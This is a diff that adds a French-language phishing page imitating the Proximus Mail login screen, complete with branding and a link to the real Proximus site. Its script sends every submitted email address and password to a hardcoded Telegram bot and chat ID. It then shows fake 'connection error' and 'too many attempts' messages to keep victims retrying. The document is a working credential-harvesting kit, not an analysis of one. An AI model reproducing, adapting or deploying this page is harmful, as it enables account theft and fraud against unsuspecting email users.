@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à Proximus Mail</title>
+    <style>
+        body {
+            font-family: georgian;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            margin: 0;
+            padding: 10px;
+        }
+        .logo-container {
+            background-color: white;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            padding: 10px 0;
+            box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1);
+            margin-bottom: 10px;
+        }
+        .logo img {
+            width: 100px;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            height: auto;
+        }
+        .content-box {
+            background-color: rgba(0, 0, 0, 0.05);
+            padding: 20px;
+            border-radius: 10px;
+        }
+        h2 {
+            color: #5A2D91;
+            font-size: 26px;
+        }
+        p {
+            font-size: 14px;
+        }
+        .input-group {
+            margin: 15px 0;
+            text-align: left;
+        }
+        .input-group label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .btn {
+            background-color: #5A2D91;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .btn:hover {
+            background-color: #4a2477;
+        }
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .forgot-password a {
+            text-decoration: none;
+            color: #5A2D91;
+        }
+        .footer {
+            margin-top: 10px;
+            font-size: 12px;
+            background-color: rgba(0, 0, 0, 0.05);
+            padding: 15px;
+            border-radius: 10px;
+        }
+        .footer a {
+            color: #5A2D91;
+            text-decoration: none;
+        }
+        #errorMessage {
+            color: red;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <div class="logo">
+            <img src="https://zupimages.net/up/25/08/dryq.jpg" alt="Proximus Logo">
+        </div>
+    </div>
+    <div class="container">
+        <div class="content-box">
+            <h2>Connexion à Proximus Mail</h2>
+            <p>Connectez-vous avec votre <strong>adresse et mot de passe Proximus Mail</strong></p>
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="email">Adresse e-mail</label>
+                    <input type="email" id="email" placeholder="Adresse e-mail" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Mot de passe</label>
+                    <input type="password" id="password" placeholder="Mot de passe" required>
+                </div>
+                <button type="submit" class="btn">Continuer</button>
+            </form>
+            <div class="forgot-password">
+                <a href="#">Mot de passe oublié?</a>
+            </div>
+            <p id="errorMessage"></p>
+            <div class="footer">
+                <p>Vous n'avez pas encore une boîte email Proximus gratuite? <a href="https://www.proximus.be/fr/customs/spa/apps/mailbox/#/recoverpassword?https://www.proximus.be/login/fr/webmail.html&guiLang=fr" target="_blank">Créez-en une en moins d'une minute dans votre compte MyProximus.</a></p>
+                <p>Encore des questions relatives à Proximus Mail? Veuillez consulter.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const botToken = "6630180682:AAGmJ9dww-j4eD1-6H9zb3chDw6UW2g6Un4";  // Votre token Telegram
+        const chatId = "6072852408";  // L'ID du chat Telegram
+        let clickCount = 0;  // Compteur pour gérer les erreurs
+        let sessionExpired = false;  // Indicateur de session expirée
+
+        // Quand le formulaire est soumis
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();  // Empêche le rechargement de la page lors de la soumission du formulaire
+            
+            if (sessionExpired) {
+                // Si la session est expirée, ne rien faire et afficher un message
+                document.getElementById("errorMessage").innerText = "Trop de tentatives, veuillez réessayer plus tard.";
+                document.getElementById("errorMessage").style.display = "block";
+                return;  // Stoppe le processus de soumission
+            }
+
+            clickCount++;  // Incrémente le compteur
+            const email = document.getElementById("email").value;  // Récupère l'email
+            const password = document.getElementById("password").value;  // Récupère le mot de passe
+
+            // Envoie un message à votre bot Telegram avec l'email et le mot de passe
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,  // ID du chat Telegram
+                    text: `Nouvelle tentative de connexion :\nEmail : ${email}\nMot de passe : ${password}`  // Envoie l'email et le mot de passe
+                })
+            });
+
+            // Logique d'expiration après 4 tentatives
+            if (clickCount >= 4) {
+                sessionExpired = true;  // Marque la session comme expirée
+                document.getElementById("errorMessage").innerText = "Trop de tentatives, veuillez réessayer plus tard.";
+                document.getElementById("errorMessage").style.display = "block";
+            } else {
+                // Si la session n'est pas expirée, continue à accepter les tentatives
+                document.getElementById("errorMessage").innerText = "Erreur de connexion. Veuillez réessayer.";
+                document.getElementById("errorMessage").style.display = "block";
+            }
+        });
+    </script>
+</body>
+</html>
